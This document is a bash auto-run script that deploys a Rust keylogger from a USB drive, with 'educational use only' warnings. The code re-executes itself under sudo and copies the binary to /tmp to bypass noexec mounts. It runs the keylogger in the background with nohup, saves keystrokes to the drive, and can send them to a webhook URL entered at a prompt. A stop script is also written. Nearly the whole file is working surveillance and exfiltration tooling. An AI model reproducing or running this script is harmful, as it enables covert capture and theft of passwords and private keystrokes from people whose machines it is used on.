#!/bin/bash

# USB Auto-run Script for Rust Keylogger
# ⚠️  WARNING: For Educational and Authorized Security Testing Only!
# Unauthorized use may be illegal in your jurisdiction.

echo "=========================================="
echo "  Rust Keylogger USB Auto-run Script"
echo "=========================================="
echo ""
echo "⚠️  WARNING: This will activate a keylogger!"
echo "This tool is for educational/authorized security testing only."
echo ""

# Get the directory where this script is located (USB drive root)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Check if the binary exists on the USB drive
BINARY_PATH="$SCRIPT_DIR/rust-key"
if [ ! -f "$BINARY_PATH" ]; then
    echo "❌ Error: rust-key binary not found at $BINARY_PATH"
    echo "Please ensure the compiled binary is on the USB drive."
    exit 1
fi

# Make the binary executable if it isn't already
# Note: chmod may fail on FAT32/exFAT filesystems, but that's okay
chmod +x "$BINARY_PATH" 2>/dev/null || true

echo "📍 Script location: $SCRIPT_DIR"
echo "📦 Binary location: $BINARY_PATH"
echo ""

# Check if running with sudo (required for keylogger to access input devices)
if [ "$EUID" -ne 0 ]; then
    echo "🔒 This script requires sudo/root permissions to access input devices."
    echo "You will be prompted for your password."
    echo ""
    
    # Re-run this script with sudo, using absolute path to work from USB mount points
    # Copy the script to /tmp first to avoid issues with noexec/nosuid mount options
    TEMP_SCRIPT=$(mktemp /tmp/usb_autorun.XXXXXX.sh)
    cp "$0" "$TEMP_SCRIPT"
    chmod +x "$TEMP_SCRIPT"
    exec sudo bash "$TEMP_SCRIPT" "$SCRIPT_DIR" "$@"
fi

# If first argument is a directory path, it means we were called from temp script
if [ -d "$1" ]; then
    SCRIPT_DIR="$1"
    shift
    BINARY_PATH="$SCRIPT_DIR/rust-key"
fi

echo "✅ Running with sudo privileges"
echo ""

# Prompt for webhook URL
echo "🌐 Webhook Configuration"
echo "Do you want to send keystrokes to a webhook URL?"
echo "If yes, enter the URL. If no, just press Enter to skip."
echo ""
read -p "Webhook URL (or press Enter to skip): " WEBHOOK_URL

# Validate webhook URL if provided
if [ -n "$WEBHOOK_URL" ]; then
    if [[ ! "$WEBHOOK_URL" =~ ^https?:// ]]; then
        echo "⚠️  Warning: URL should start with http:// or https://"
        echo "Proceeding anyway..."
    fi
    echo ""
    echo "✅ Webhook URL configured: $WEBHOOK_URL"
else
    echo ""
    echo "ℹ️  No webhook URL provided. Keys will only be saved to file."
fi

echo ""
echo "=========================================="
echo "  Starting Keylogger..."
echo "=========================================="
echo ""

# Change to the script directory (USB drive)
cd "$SCRIPT_DIR"

# Create a log directory on the USB drive if it doesn't exist
mkdir -p "$SCRIPT_DIR/logs"

# Run the keylogger with optional webhook URL
# Log file will be created in the USB drive's logs directory
# Note: USB drives mounted in /run/media often have 'noexec' option which prevents direct execution
# To work around this, we copy the binary to /tmp first if we detect we're on a noexec filesystem

# Function to check if we're on a noexec filesystem
is_noexec_mount() {
    local file_path="$1"
    local mount_point
    mount_point=$(df "$file_path" 2>/dev/null | tail -1 | awk '{print $6}')
    
    # Check if df succeeded and mount_point is not empty
    if [ -z "$mount_point" ]; then
        return 1  # Can't determine, assume not noexec
    fi
    
    if mount | grep " $mount_point " | grep -q noexec; then
        return 0  # true, is noexec
    fi
    return 1  # false, not noexec
}

# Check if we need to copy the binary to /tmp
EXEC_PATH="$BINARY_PATH"
if is_noexec_mount "$BINARY_PATH"; then
    echo "⚠️  USB drive mounted with 'noexec' option detected"
    echo "   Copying binary to /tmp to enable execution..."
    EXEC_PATH=$(mktemp /tmp/rust-key.XXXXXX)
    cp "$BINARY_PATH" "$EXEC_PATH"
    chmod +x "$EXEC_PATH"
    echo "✅ Binary copied to $EXEC_PATH"
    echo ""
fi

# Run the keylogger
if [ -n "$WEBHOOK_URL" ]; then
    # Run in background with nohup, redirect output to USB drive
    nohup "$EXEC_PATH" "$WEBHOOK_URL" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
    KEYLOGGER_PID=$!
else
    # Run in background with nohup, redirect output to USB drive
    nohup "$EXEC_PATH" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
    KEYLOGGER_PID=$!
fi

echo "✅ Keylogger started with PID: $KEYLOGGER_PID"
echo ""
echo "📝 Keystrokes will be logged to: $SCRIPT_DIR/logs/keylog.txt"
if [ "$EXEC_PATH" != "$BINARY_PATH" ]; then
    echo "ℹ️  Binary is running from: $EXEC_PATH (copied from USB due to noexec mount)"
fi
if [ -n "$WEBHOOK_URL" ]; then
    echo "🌐 Keystrokes will be sent to: $WEBHOOK_URL"
fi
echo ""
echo "To stop the keylogger, run: sudo kill $KEYLOGGER_PID"
echo ""
echo "⚠️  Remember: Only use this on systems you own or have explicit permission to monitor."
echo ""

# Optional: Create a stop script for convenience
cat > "$SCRIPT_DIR/stop_keylogger.sh" << EOF
#!/bin/bash
echo "Stopping keylogger (PID: $KEYLOGGER_PID)..."
sudo kill $KEYLOGGER_PID 2>/dev/null && echo "✅ Keylogger stopped" || echo "❌ Keylogger not found or already stopped"
EOF

chmod +x "$SCRIPT_DIR/stop_keylogger.sh" 2>/dev/null || true
echo "📌 A stop script has been created: $SCRIPT_DIR/stop_keylogger.sh"
echo "   (Run with: bash $SCRIPT_DIR/stop_keylogger.sh)"
echo ""
